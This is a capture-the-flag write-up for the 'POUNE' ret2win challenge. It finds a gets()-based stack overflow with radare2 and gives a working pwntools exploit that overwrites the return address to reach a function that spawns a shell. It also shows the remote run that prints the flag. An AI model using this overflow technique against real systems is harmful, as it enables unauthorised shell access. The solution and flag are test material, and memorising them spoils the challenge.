# POUNE

## Description
Solves: 31  Medium

Hello frend!
Can you read flag.txt?

nc challs.ctf.cafe 8888

Author : Zerotistic

## Files
1. Chall - The compiled binary running on the machine

## Analysis
Now the source code isn't provided, so if we take a look the binary using ghydra we can see that the program just take an user entry using gets(), which is unsafe, to a 4 bytes size buff, and makes a return finishing the program. If we take a look tho the functions we can see there's one called "pelase_call_me", which just give us a shell.

The binary is compiled without Adress Space randomization, so we can get the address of this funcion with radare 2:
```bash
$ r2 chall 
[0x00401060]> aa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze all functions arguments/locals (afva@@@F)
[0x00401060]> afl
0x00401060    1     37 entry0
0x004010a0    4     31 sym.deregister_tm_clones
0x004010d0    4     49 sym.register_tm_clones
0x00401110    3     32 sym.__do_global_dtors_aux
0x00401140    1      6 sym.frame_dummy
0x0040119c    1     13 sym._fini
0x00401090    1      5 loc..annobin_static_reloc.c
0x00401157    1     68 main
0x00401030    1      6 sym.imp.puts
0x00401050    1      6 sym.imp.gets
0x00401000    3     27 sym._init
0x00401146    1     17 sym.please_call_me
0x00401040    1      6 sym.imp.system
[0x00401060]> 
```
We can also use this tool with the visual mode to check the assembly code of the binary.

This is obviously a Ret2Win challenge.


## Exploit
Objetive: We must change the instruction pointer, so instead finishing the program on the return, it will go to the ret2win function (please_call_me)

An easy way to see when we can overwrite the IP is just execute the program increasing the lenght of the entry by one each time until we get a core. We don't have any problem with 11, but if we insert 12 chars we get a core, that's when we are overwriting the IP

Let's write the local exploit, it must look like this one:
```python
from pwn import *

p=process("./chall")

payload = b'A'*12
payload+= p64(0x0040114a)

p.sendline(payload)
p.interactive()
```
¿Why I wrote 0x0040114a (0x00401146 +5) isntead of 0x00401146?
This is becouse to recive the shell they used system(), that uses 2 registers and you must "jump over them" to don't get a core. I have to ask the to the creator of the challenge about it becouse I didn't notice. Thanks Zerotistic :p

If we run the program we get a local shell

To make it remote we just have to change lines 3 and 4 to this:
```python
p=remote("challs.ctf.cafe", 8888)
```

And if we run it...
```bash
$ py exploit.py 
[+] Opening connection to challs.ctf.cafe on port 8888: Done
[*] Switching to interactive mode
$ cat flag.txt
RUSH{D1d_y0u_s33_TH4t_M0m}
$
```
